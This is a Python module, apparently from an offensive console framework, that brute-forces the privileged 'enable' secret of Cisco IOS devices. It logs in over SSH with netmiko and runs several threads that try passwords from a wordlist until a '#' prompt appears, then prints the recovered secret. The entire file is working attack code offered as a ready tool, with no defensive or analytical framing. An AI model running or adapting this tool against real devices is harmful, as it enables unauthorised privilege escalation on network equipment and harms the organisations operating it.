import asyncio
import socket
import netmiko
import concurrent.futures

from pathlib import Path
from src.core.base.BaseModule import BaseModule
from src.core.registry.ModuleRegistry import ModuleRegistry
from src.core.registry.OptionRegistry import OptionRegistry
from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.styles import Style

prompt_style = Style.from_dict({"prompt": "ansired bold"})


class SecretModule(BaseModule):

    helper = {
        'name': 'secret_bf',
        'help': 'This module will attempt to bruteforce Cisco secret password',
        'usage': 'use secret_bf'
    }

    options = {
        'module': {
            'host': [
                '10.10.10.3',
                'The IPv4 Address of the Cisco SSH service',
                ''
            ],
            'port': [
                '22',
                'The port number of the Cisco SSH service',
                ''
            ],
            'username': [
                'bob',
                'The username of the Cisco SSH service',
                ''
            ],
            'password': [
                'itsbob',
                'The password of the Cisco SSH server',
                ''
            ],
            'word_list': [
                'passwords.txt',
                'The word list used for the brute-force attempts',
                ''
            ],
            'workers': [
                '4',
                'The number of workers to run in parallel',
                ''
            ]
        }
    }

    def __init__(self, command: str, print_queue: asyncio.Queue, console: object):
        super().__init__()
        self.command: str = command
        self.console: object = console
        self.print_queue: asyncio.Queue = print_queue
        self.module_register: ModuleRegistry = ModuleRegistry()
        self.option_register: OptionRegistry = OptionRegistry()
        self.work_queue: asyncio.Queue = asyncio.Queue()
        self.found_credentials: str = ""
        self.found = False

    async def main(self) -> None:
        await self.register()
        await self.module_shell()

    @staticmethod
    def return_list_from_file(filename: str) -> list:
        if filename == '':
            return []
        return [x.rstrip() for x in open(filename, encoding='utf8')] if Path(filename).is_file() else [filename]

    async def register(self) -> None:
        self.option_register.register_options(options=self.options)

    async def module_shell(self) -> None:
        session = PromptSession()
        allowed_commands = ['set', 'options', 'run', 'back']
        while True:
            try:
                prompt_text = self.option_register.get_register_value('prompt')
                sub_prompt = f"{prompt_text} [{self.helper['name']}]> "
                data: str = await session.prompt_async(sub_prompt, style=prompt_style)
                if not data or not data.startswith(tuple(allowed_commands)):
                    continue
                if data.startswith(tuple(['back', 'exit'])):
                    raise EOFError
                if data.startswith(tuple(['set', 'options'])):
                    # noinspection PyUnresolvedReferences
                    await self.console.command_interpreter(data)
                if data.startswith(tuple(['run', 'exploit'])):
                    await asyncio.create_task(self.execute())
            except (EOFError, KeyboardInterrupt):
                await self.unregister()
                break

    async def unregister(self) -> None:
        options: dict = self.option_register.get_register_dict()
        if 'module' in options.keys():
            options.pop('module')
            self.option_register.register_options(options)

    async def execute(self) -> None:
        executor = concurrent.futures.ThreadPoolExecutor()
        host: str = self.option_register.get_register_value('host')
        port: str = self.option_register.get_register_value('port')
        username: str = self.option_register.get_register_value('username')
        password: str = self.option_register.get_register_value('password')
        word_list: list = self.return_list_from_file(self.option_register.get_register_value('word_list'))
        workers: str = self.option_register.get_register_value('workers')

        device: dict = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'device_type': 'cisco_ios'
        }

        if not all([host, port, username, password, word_list]):
            await self.print_queue.put(f"module requires all options to be complete before starting.\n")
            return
        try:
            socket.gethostbyname(host)
            if not 1 <= int(port) <= 65535:
                await self.print_queue.put(f"module port '{port}' is not a valid port number.\n")
                return
        except socket.error:
            await self.print_queue.put(f"module hostname '{host}' is not valid or could not be resolved.\n")
            return

        [self.work_queue.put_nowait(x.rstrip()) for x in word_list]
        loop = asyncio.get_running_loop()
        blocking_io = [loop.run_in_executor(executor, self.blocking_io, device, i) for i in range(int(workers))]
        completed, pending = await asyncio.wait(blocking_io)
        _ = [t.result() for t in completed]

        if self.found:
            password = self.found_credentials
            self.print_queue.put_nowait(f"\n[Found Secret] - Password: {password}\n")

    def blocking_io(self, device: dict, uid: int):
        secret: str = ''
        try:
            cisco_device = netmiko.Netmiko(**device)
            self.print_queue.put_nowait(f"[Worker {uid}] - Connected to device, starting password brute-force attack")
            if cisco_device.check_enable_mode():
                self.print_queue.put_nowait(f"It seems privilege mode does not require a password?!\n")
                return
            while not self.found:
                if cisco_device.check_enable_mode():
                    self.print_queue.put_nowait(f"Password '{secret}' was successful!\n")
                    self.found_credentials = secret
                    self.found = True
                    return
                cisco_device.send_command('enable', expect_string='word', delay_factor=2)
                while True:
                    secret: str = self.work_queue.get_nowait()
                    self.print_queue.put_nowait(f"Attempting password: {secret:<30}")
                    output = cisco_device.send_command_timing(secret, strip_prompt=False)
                    self.work_queue.task_done()
                    if '#' in output or '%' in output:
                        break
                    continue
                continue
        except asyncio.queues.QueueEmpty:
            pass
        except netmiko.ssh_exception:
            pass
        except netmiko.NetmikoAuthenticationException:
            self.print_queue.put_nowait(f"SSH login credentials are incorrect.\n")
            return
        except netmiko.NetMikoTimeoutException:
            self.print_queue.put_nowait(('error', f"SSH connection timed out"))
            return
